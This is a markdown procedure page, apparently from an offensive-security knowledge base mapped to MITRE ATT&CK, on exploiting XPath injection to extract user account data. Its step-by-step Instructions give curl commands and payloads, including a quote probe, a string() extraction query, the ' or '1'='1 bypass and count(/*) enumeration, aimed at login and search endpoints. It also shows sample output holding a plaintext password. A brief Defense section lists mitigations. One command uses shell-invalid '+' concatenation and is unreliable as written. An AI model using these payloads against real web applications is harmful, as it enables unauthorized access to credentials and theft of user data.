---
id: 9bc00ac6-2744-4b8e-93c9-4ea3c2350a89
name: XPath-Injection-for-User-Account-Retrieval
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.391405+00:00'
updated_at: '2023-04-10T20:24:47.931694+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/Exploitation]]'
  - '[[tags/XPATH Injection]]'
commands:
  - '[[commands/curl-send-xpath-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# XPath-Injection-for-User-Account-Retrieval

## Summary

This procedure demonstrates how to exploit an XPath injection vulnerability in a web application to retrieve sensitive user account information, such as usernames, passwords, and account details stored in an underlying XML database. By injecting malicious XPath expressions into input fields like login forms or search parameters, an attacker can manipulate the query to extract data beyond the intended scope.

## Description

XPath injection targets applications that construct XPath queries from user input without proper sanitization, allowing attackers to alter the query logic. For example, in a login form querying an XML file for user credentials, an attacker can inject payloads to return all users or specific account details. This technique is common in legacy web apps using XML for data storage. The procedure assumes a vulnerable endpoint like a user search or authentication form. Successful exploitation can lead to unauthorized data disclosure, enabling further attacks like credential stuffing. Map to MITRE ATT&CK: [[Exploit Public-Facing Application]] Exploit Public-Facing Application under [[Initial Access]] Initial Access.

## Requirements

1. Access to a web application vulnerable to XPath injection (e.g., via a login or search form that queries XML data).
2. Tools for intercepting and modifying HTTP requests, such as [[tools/Burp-Suite]] or curl.
3. Knowledge of the application's XML structure (inferred from error messages or testing).
4. Network access to the target endpoint.

## Defense

- Implement input validation and sanitization to escape special XPath characters (e.g., quotes, slashes).
- Use parameterized XPath queries or prepared statements to separate user input from the query structure.
- Deploy web application firewalls (WAFs) to detect anomalous XPath patterns in requests.
- Limit XML data exposure and use access controls to restrict sensitive account information.

## Objectives

1. Identify and confirm the XPath injection vulnerability in the target input field.
2. Craft and inject an XPath payload to extract user account details.
3. Retrieve and parse the response to obtain sensitive information like usernames and passwords.

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate an input field (e.g., username in a login form) that constructs XPath queries from user input. Test for vulnerability by submitting single quotes (') to trigger errors revealing XML structure.

**Command** ([[commands/curl-send-xpath-payload]]):
```bash
curl -X POST http://target.com/login -d "username='" -d "password=test"
```

> This sends a basic probe to check for injection. Look for XML errors in the response, such as "XPath syntax error" or partial XML dumps, confirming vulnerability. If no error, try variations like " or 1=1.

### Step 2: Craft and Inject XPath Payload for Account Extraction

**Context**: Use a crafted XPath expression to query the XML for all user accounts or specific details. Replace variables in the payload with target values. This step modifies the query to return account text from matching users.

**Code** ([[codes/XPath-Account-Info-Extraction-Payload]]):

The payload is injected into the input field to construct a query like: string(//user[name/text()='admin' and password/text()='pass']/account/text())

**Command** ([[commands/curl-send-xpath-payload]]):
```bash
curl -X POST http://target.com/login -d "username=\"string(//user[name/text()='" + $USERNAME + "' and password/text()='" + $PASSWORD + "']/account/text())\" " -d "password=test"
```

> Substitute $USERNAME and $PASSWORD with test values (e.g., admin). The response should include extracted account data if successful. This bypasses authentication by altering the XPath to extract rather than validate.

### Step 3: Test Advanced Payloads for Broader Extraction

**Context**: If basic extraction fails, use additional payloads to enumerate XML nodes, count elements, or extract multiple users. This helps map the XML structure and retrieve more data.

**Code** ([[codes/Common-XPath-Injection-Payloads]]):

Inject payloads like ' or '1'='1 to bypass, or count(/*) to enumerate nodes.

**Command** ([[commands/curl-send-xpath-payload]]):
```bash
curl -X POST http://target.com/search -d "search=') or '1'='1" 
```

> Expected: Response dumps all users or triggers broader data return. Use payloads sequentially to probe: start with boolean tests, then node counts, finally targeted extractions.

## Expected Output

Successful injection returns XML fragments or formatted data like:
```
<user><name>admin</name><password>secretpass</password><account>Premium</account></user>
```
Or a list of all accounts if using universal payloads. Failure shows standard error pages or no data.

## Related

- [[codes/XPath-Account-Info-Extraction-Payload]]
- [[codes/Common-XPath-Injection-Payloads]]
